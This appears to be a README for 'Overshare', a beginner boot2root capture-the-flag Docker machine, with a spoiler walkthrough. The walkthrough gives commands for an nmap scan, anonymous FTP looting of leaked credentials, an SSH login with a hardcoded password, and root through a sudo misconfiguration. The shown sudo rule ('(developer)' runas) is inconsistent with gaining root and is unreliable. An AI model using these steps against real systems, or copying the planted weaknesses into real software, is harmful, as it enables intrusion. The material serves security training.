# Overshare

A beginner friendly boot2root machine. Difficulty: Easy.

The whole box is one Docker container running FTP and SSH. The
intended path is scan, enumerate, grab leaked credentials over
anonymous FTP, log in over SSH for the user flag, then abuse a
sudo misconfiguration for root.

## Difficulty
Easy. Good first machine for someone learning enumeration.

## Skills covered
- Port scanning with nmap
- Anonymous FTP enumeration and file download
- Credential reuse
- SSH login
- Basic Linux privilege escalation via `sudo -l`

## Deploy

```bash
docker compose up -d --build
```

The machine is now reachable on the host IP:
- 21/tcp  FTP
- 22/tcp  SSH

Stop and clean up:

```bash
docker compose down
```

## Flags
- User flag lives in the developer home directory.
- Root flag lives in /root.

Flag format: hackctf{...}

---

## Intended Walkthrough (SPOILER)

1. Scan the target.

   ```bash
   nmap -sC -sV -p- <target-ip>
   ```

   Ports 21 (FTP) and 22 (SSH) are open. FTP allows anonymous login.

2. Log in to FTP anonymously and pull the files.

   ```bash
   ftp <target-ip>
   # Name: anonymous
   # Password: (blank)
   cd pub
   ls
   get note.txt
   get backup.txt
   bye
   ```

   `backup.txt` leaks SSH credentials for the user `developer`.

3. Log in over SSH and read the user flag.

   ```bash
   ssh developer@<target-ip>
   # password: Sup3rS3cretFTP2024
   cat user.txt
   ```

4. Check sudo rights and escalate.

   ```bash
   sudo -l
   # (developer) NOPASSWD: /usr/bin/su
   sudo su -l
   cat /root/root.txt
   ```

Rooted.

## Notes for the author
- Change the flags in `flags/user.txt` and `flags/root.txt` before
  publishing so they are unique to your event.
- Change the developer password in the Dockerfile (and keep it a
  wordlist entry if you want the brute force path) and update the
  `ftp/backup.txt` if you want a fresh credential.
